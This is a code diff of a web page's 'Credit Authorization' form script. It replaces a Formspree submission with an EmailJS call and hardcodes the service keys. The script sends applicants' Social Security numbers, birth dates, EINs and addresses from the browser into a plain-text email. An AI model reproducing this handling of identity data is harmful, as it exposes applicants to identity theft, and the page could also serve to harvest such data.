@@ -884,7 +884,10 @@
 
 </div><!-- /page-wrapper -->
 
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
+  emailjs.init('tsrWaics2GZGS8Ml5');
+
   // Set today's date
   const today = new Date();
   const dateStr = today.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
@@ -1035,30 +1038,34 @@
     const ref = 'CFG-' + today.getFullYear() + '-' + Math.floor(1000 + Math.random() * 9000);
     document.getElementById('refNumber').textContent = 'Reference: ' + ref;
 
-    // Collect form data and send to Formspree
-    const formData = new FormData();
-    formData.append('_subject', 'New Credit Authorization — ' + ref);
-    formData.append('First Name', document.getElementById('firstName').value);
-    formData.append('Last Name', document.getElementById('lastName').value);
-    formData.append('Date of Birth', document.getElementById('dob').value);
-    formData.append('SSN', document.getElementById('ssn').value);
-    formData.append('Email', document.getElementById('email').value);
-    formData.append('Phone', document.getElementById('phone').value);
-    formData.append('Address', document.getElementById('address').value);
-    formData.append('City', document.getElementById('city').value);
-    formData.append('State', document.getElementById('state').value);
-    formData.append('ZIP', document.getElementById('zip').value);
-    formData.append('Business Name', document.getElementById('businessName') ? document.getElementById('businessName').value : '');
-    formData.append('EIN / Tax ID', document.getElementById('ein').value);
-    formData.append('Printed Name', document.getElementById('printedName').value);
-    formData.append('Reference Number', ref);
-    formData.append('Consent Checked', 'Yes');
-    formData.append('Signature Provided', hasSig ? 'Yes' : 'No');
-
-    fetch('https://formspree.io/f/xdapgqgk', {
-      method: 'POST',
-      body: formData,
-      headers: { 'Accept': 'application/json' }
+    // Send via EmailJS
+    emailjs.send('service_tfrji6y', 'template_jqtgjx3', {
+      subject: 'New Credit Authorization — ' + ref,
+      first_name: document.getElementById('firstName').value,
+      last_name: document.getElementById('lastName').value,
+      dob: document.getElementById('dob').value,
+      ssn: document.getElementById('ssn').value,
+      email: document.getElementById('email').value,
+      phone: document.getElementById('phone').value,
+      address: document.getElementById('address').value,
+      city: document.getElementById('city').value,
+      state: document.getElementById('state').value,
+      zip: document.getElementById('zip').value,
+      ein: document.getElementById('ein').value,
+      printed_name: document.getElementById('printedName').value,
+      reference: ref,
+      consent: 'Yes',
+      signature: hasSig ? 'Yes' : 'No',
+      message: 'New Credit Authorization Form submitted.\n\nReference: ' + ref +
+        '\nName: ' + document.getElementById('firstName').value + ' ' + document.getElementById('lastName').value +
+        '\nDOB: ' + document.getElementById('dob').value +
+        '\nSSN: ' + document.getElementById('ssn').value +
+        '\nEmail: ' + document.getElementById('email').value +
+        '\nPhone: ' + document.getElementById('phone').value +
+        '\nAddress: ' + document.getElementById('address').value + ', ' + document.getElementById('city').value + ', ' + document.getElementById('state').value + ' ' + document.getElementById('zip').value +
+        '\nEIN: ' + document.getElementById('ein').value +
+        '\nPrinted Name: ' + document.getElementById('printedName').value +
+        '\nConsent: Yes\nSignature Provided: ' + (hasSig ? 'Yes' : 'No')
     });
 
     // Show success
